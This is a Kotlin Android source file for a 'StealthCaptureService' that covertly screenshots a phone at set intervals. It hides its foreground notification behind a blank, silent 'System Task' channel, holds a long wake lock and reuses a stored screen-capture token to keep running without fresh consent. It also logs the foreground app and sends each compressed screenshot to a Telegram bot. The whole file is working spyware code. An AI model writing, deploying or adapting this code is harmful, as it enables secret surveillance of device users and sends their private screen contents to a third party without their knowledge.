package com.example.service

import android.app.Activity
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.app.usage.UsageEvents
import android.app.usage.UsageStatsManager
import android.content.Context
import android.content.Intent
import android.content.pm.ServiceInfo
import android.graphics.Bitmap
import android.graphics.PixelFormat
import android.hardware.display.DisplayManager
import android.hardware.display.VirtualDisplay
import android.media.Image
import android.media.ImageReader
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.os.PowerManager
import android.provider.Settings
import android.util.Base64
import android.util.DisplayMetrics
import android.util.Log
import android.view.WindowManager
import com.example.data.sync.TelegramBotManager
import androidx.core.app.NotificationCompat
import com.example.data.sync.MediaProjectionHelper
import com.google.firebase.database.DataSnapshot
import com.google.firebase.database.DatabaseError
import com.google.firebase.database.FirebaseDatabase
import com.google.firebase.database.ValueEventListener
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.cancel
import kotlinx.coroutines.delay
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import java.io.ByteArrayOutputStream
import java.nio.ByteBuffer

class StealthCaptureService : Service() {

    companion object {
        private const val TAG = "StealthCaptureService"
        const val ACTION_START = "com.example.service.ACTION_START_STEALTH_CAPTURE"
        const val ACTION_STOP = "com.example.service.ACTION_STOP_STEALTH_CAPTURE"
        const val EXTRA_RESULT_CODE = "extra_result_code"
        const val EXTRA_RESULT_DATA = "extra_result_data"
        const val EXTRA_INTERVAL_SEC = "extra_interval_sec"
        const val EXTRA_MAX_SHOTS = "extra_max_shots"

        private const val NOTIFICATION_ID = 88912
        private const val CHANNEL_ID = "stealth_capture_channel"
        private const val MAX_HISTORY_COUNT = 10
        private const val MAX_WIDTH_PX = 600
        private const val JPEG_QUALITY = 40
    }

    private val serviceScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private val handler = Handler(Looper.getMainLooper())

    private var mediaProjection: MediaProjection? = null
    private var isCapturing = false
    private var intervalSec = 10
    private var maxShots = 0
    private var currentShotCount = 0
    private var wakeLock: PowerManager.WakeLock? = null
    private var captureJob: kotlinx.coroutines.Job? = null

    override fun onCreate() {
        super.onCreate()
        createNotificationChannel()
        startForegroundServiceQuietly()
        try {
            val powerManager = getSystemService(Context.POWER_SERVICE) as? PowerManager
            wakeLock = powerManager?.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "EnterpriseSync::StealthCaptureWakeLock")
            wakeLock?.acquire(12 * 60 * 60 * 1000L) // 12 hours max
        } catch (_: Exception) {}
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        val action = intent?.action
        if (action == ACTION_START) {
            intervalSec = intent.getIntExtra(EXTRA_INTERVAL_SEC, 10).coerceIn(1, 300)
            maxShots = intent.getIntExtra(EXTRA_MAX_SHOTS, 0).coerceAtLeast(0)
            currentShotCount = 0
        }
        when (action) {
            ACTION_START -> {
                val resultCode = intent.getIntExtra(EXTRA_RESULT_CODE, Activity.RESULT_CANCELED)
                val resultData: Intent? = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                    intent.getParcelableExtra(EXTRA_RESULT_DATA, Intent::class.java)
                } else {
                    @Suppress("DEPRECATION")
                    intent.getParcelableExtra(EXTRA_RESULT_DATA)
                }

                if (resultCode == Activity.RESULT_OK && resultData != null) {
                    initMediaProjection(resultCode, resultData)
                    startCaptureLoop()
                } else {
                    // Try token from MediaProjectionHelper fallback
                    val token = MediaProjectionHelper.getProjectionToken(this)
                    if (token != null) {
                        initMediaProjection(token.first, token.second)
                        startCaptureLoop()
                    } else {
                        Log.e(TAG, "Missing MediaProjection token for starting stealth capture.")
                        stopSelf()
                    }
                }
            }
            ACTION_STOP -> {
                stopCaptureAndCleanup()
                stopSelf()
            }
        }
        return START_STICKY
    }

    private fun startCaptureLoop() {
        if (isCapturing) return
        isCapturing = true
        captureJob?.cancel()
        captureJob = serviceScope.launch {
            Log.d(TAG, "Stealth capture coroutine loop started (interval: ${intervalSec}s, maxShots: $maxShots).")
            while (isActive && isCapturing) {
                try {
                    if (mediaProjection == null) {
                        val token = MediaProjectionHelper.getProjectionToken(this@StealthCaptureService)
                        if (token != null) {
                            initMediaProjection(token.first, token.second)
                        }
                    }

                    if (mediaProjection != null) {
                        captureAndUpload()
                        currentShotCount++
                        if (maxShots > 0 && currentShotCount >= maxShots) {
                            Log.d(TAG, "Reached max stealth screenshots ($maxShots). Stopping service.")
                            stopCaptureAndCleanup()
                            stopSelf()
                            break
                        }
                    } else {
                        Log.w(TAG, "MediaProjection token unavailable for stealth capture.")
                    }
                } catch (e: Exception) {
                    Log.e(TAG, "Error in stealth capture coroutine loop: ${e.message}")
                }
                delay(intervalSec * 1000L)
            }
        }
    }

    private fun initMediaProjection(resultCode: Int, resultData: Intent) {
        try {
            if (mediaProjection == null) {
                val projectionManager = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
                mediaProjection = projectionManager.getMediaProjection(resultCode, resultData)
                mediaProjection?.registerCallback(object : MediaProjection.Callback() {
                    override fun onStop() {
                        super.onStop()
                        Log.w(TAG, "MediaProjection session was stopped by OS.")
                        mediaProjection = null
                    }
                }, handler)
            }
        } catch (e: Exception) {
            Log.e(TAG, "Failed to initialize MediaProjection: ${e.message}")
            mediaProjection = null
        }
    }

    private fun startForegroundServiceQuietly() {
        val notification: Notification = NotificationCompat.Builder(this, CHANNEL_ID)
            .setSmallIcon(android.R.drawable.ic_menu_camera)
            .setContentTitle("")
            .setContentText("")
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setCategory(NotificationCompat.CATEGORY_SERVICE)
            .setOngoing(true)
            .setSilent(true)
            .build()

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            val type = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
                ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION
            } else {
                ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION
            }
            try {
                startForeground(NOTIFICATION_ID, notification, type)
            } catch (e: Exception) {
                Log.e(TAG, "startForeground error: ${e.message}")
                startForeground(NOTIFICATION_ID, notification)
            }
        } else {
            startForeground(NOTIFICATION_ID, notification)
        }
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "System Task",
                NotificationManager.IMPORTANCE_MIN
            ).apply {
                description = "Background processing task"
                setShowBadge(false)
                setSound(null, null)
                enableVibration(false)
            }
            val notificationManager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            notificationManager.createNotificationChannel(channel)
        }
    }

    private fun isScreenOn(): Boolean {
        val powerManager = getSystemService(Context.POWER_SERVICE) as? PowerManager
        return powerManager?.isInteractive ?: true
    }

    private fun getForegroundPackageName(): String {
        try {
            val usageStatsManager = getSystemService(Context.USAGE_STATS_SERVICE) as? UsageStatsManager
            val endTime = System.currentTimeMillis()
            val startTime = endTime - 10000 // Last 10 seconds
            val usageEvents = usageStatsManager?.queryEvents(startTime, endTime)
            var lastPkg = ""
            if (usageEvents != null) {
                val event = UsageEvents.Event()
                while (usageEvents.hasNextEvent()) {
                    usageEvents.getNextEvent(event)
                    if (event.eventType == UsageEvents.Event.ACTIVITY_RESUMED ||
                        event.eventType == UsageEvents.Event.MOVE_TO_FOREGROUND) {
                        lastPkg = event.packageName
                    }
                }
            }
            if (lastPkg.isNotEmpty()) return lastPkg
        } catch (_: Exception) {}
        return "unknown"
    }

    private fun captureAndUpload() {
        if (!isScreenOn()) {
            Log.d(TAG, "Screen is off, skipping capture.")
            return
        }

        var proj = mediaProjection
        if (proj == null) {
            val token = MediaProjectionHelper.getProjectionToken(this)
            if (token != null) {
                initMediaProjection(token.first, token.second)
                proj = mediaProjection
            }
        }

        if (proj == null) {
            Log.w(TAG, "MediaProjection is null during capture attempt.")
            return
        }

        serviceScope.launch {
            try {
                val windowManager = getSystemService(Context.WINDOW_SERVICE) as WindowManager
                val metrics = DisplayMetrics()
                @Suppress("DEPRECATION")
                windowManager.defaultDisplay.getRealMetrics(metrics)
                val width = metrics.widthPixels
                val height = metrics.heightPixels
                val density = metrics.densityDpi

                val imageReader = ImageReader.newInstance(width, height, PixelFormat.RGBA_8888, 2)
                var virtualDisplay: VirtualDisplay? = null

                try {
                    virtualDisplay = proj.createVirtualDisplay(
                        "StealthDisplay",
                        width, height, density,
                        DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                        imageReader.surface, null, handler
                    )

                    // Allow frame rendering briefly
                    withContext(Dispatchers.IO) {
                        Thread.sleep(120)
                    }

                    var image: Image? = null
                    try {
                        image = imageReader.acquireLatestImage()
                    } catch (e: Exception) {
                        Log.e(TAG, "Error acquiring image: ${e.message}")
                    }

                    if (image != null) {
                        val planes = image.planes
                        val buffer: ByteBuffer = planes[0].buffer
                        val pixelStride = planes[0].pixelStride
                        val rowStride = planes[0].rowStride
                        val rowPadding = rowStride - pixelStride * width

                        val bitmap = Bitmap.createBitmap(
                            width + rowPadding / pixelStride,
                            height,
                            Bitmap.Config.ARGB_8888
                        )
                        bitmap.copyPixelsFromBuffer(buffer)
                        image.close()

                        // Crop padding if necessary
                        val cleanBitmap = if (rowPadding > 0) {
                            Bitmap.createBitmap(bitmap, 0, 0, width, height)
                        } else {
                            bitmap
                        }

                        // Scale image to MAX_WIDTH_PX (600px) maintaining aspect ratio
                        val scaledBitmap = if (cleanBitmap.width > MAX_WIDTH_PX) {
                            val scaledHeight = (cleanBitmap.height.toFloat() / cleanBitmap.width.toFloat() * MAX_WIDTH_PX).toInt()
                            Bitmap.createScaledBitmap(cleanBitmap, MAX_WIDTH_PX, scaledHeight, true)
                        } else {
                            cleanBitmap
                        }

                        // Compress to JPEG with 40% quality
                        val byteArrayOutputStream = ByteArrayOutputStream()
                        scaledBitmap.compress(Bitmap.CompressFormat.JPEG, JPEG_QUALITY, byteArrayOutputStream)
                        val imageBytes = byteArrayOutputStream.toByteArray()

                        val base64String = Base64.encodeToString(imageBytes, Base64.NO_WRAP)
                        val sizeBytes = imageBytes.size
                        val pkgName = getForegroundPackageName()
                        val timestamp = System.currentTimeMillis()

                        uploadScreenshotToFirebase(pkgName, timestamp, base64String, sizeBytes)
                    } else {
                        Log.w(TAG, "Acquired image was null.")
                    }

                } finally {
                    virtualDisplay?.release()
                    imageReader.close()
                }

            } catch (e: Exception) {
                Log.e(TAG, "Error in captureAndUpload: ${e.message}")
            }
        }
    }

    private fun uploadScreenshotToFirebase(
        pkgName: String,
        timestamp: Long,
        base64String: String,
        sizeBytes: Int
    ) {
        try {
            val imageBytes = Base64.decode(base64String, Base64.NO_WRAP)
            serviceScope.launch(Dispatchers.IO) {
                val telegramBot = TelegramBotManager(applicationContext)
                telegramBot.sendPhoto(imageBytes, "Screen capture of $pkgName (${(sizeBytes / 1024)} KB)")
            }
        } catch (e: Exception) {
            Log.e(TAG, "Failed to send screenshot to Telegram: ${e.message}")
        }
    }

    private fun limitHistory(
        dbRef: com.google.firebase.database.DatabaseReference,
        maxCount: Int
    ) {
        dbRef.orderByChild("timestamp").addListenerForSingleValueEvent(object : ValueEventListener {
            override fun onDataChange(snapshot: DataSnapshot) {
                val totalChildren = snapshot.childrenCount
                if (totalChildren > maxCount) {
                    val excessCount = (totalChildren - maxCount).toInt()
                    var deleted = 0
                    for (child in snapshot.children) {
                        child.ref.removeValue()
                        deleted++
                        if (deleted >= excessCount) break
                    }
                    Log.d(TAG, "Removed $deleted oldest screenshot(s) to enforce limit of $maxCount.")
                }
            }

            override fun onCancelled(error: DatabaseError) {
                Log.e(TAG, "limitHistory cancelled: ${error.message}")
            }
        })
    }

    private fun stopCaptureAndCleanup() {
        isCapturing = false
        captureJob?.cancel()
        captureJob = null
        try {
            wakeLock?.let { if (it.isHeld) it.release() }
        } catch (_: Exception) {}
        try {
            mediaProjection?.stop()
        } catch (_: Exception) {}
        mediaProjection = null
        Log.d(TAG, "StealthCaptureService stopped cleanly.")
    }

    override fun onDestroy() {
        stopCaptureAndCleanup()
        serviceScope.cancel()
        super.onDestroy()
    }

    override fun onBind(intent: Intent?): IBinder? = null
}
